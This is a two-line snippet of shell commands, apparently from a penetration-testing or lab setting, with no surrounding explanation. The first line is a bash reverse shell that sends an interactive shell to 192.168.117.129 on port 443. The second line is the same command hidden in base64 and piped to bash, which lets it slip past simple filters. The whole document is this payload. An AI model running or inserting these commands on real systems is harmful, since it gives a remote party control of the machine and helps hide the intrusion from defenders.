bash -i >& /dev/tcp/192.168.117.129/443 0>&1
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNy4xMjkvNDQzIDA+JjE= | base64 -d | bash

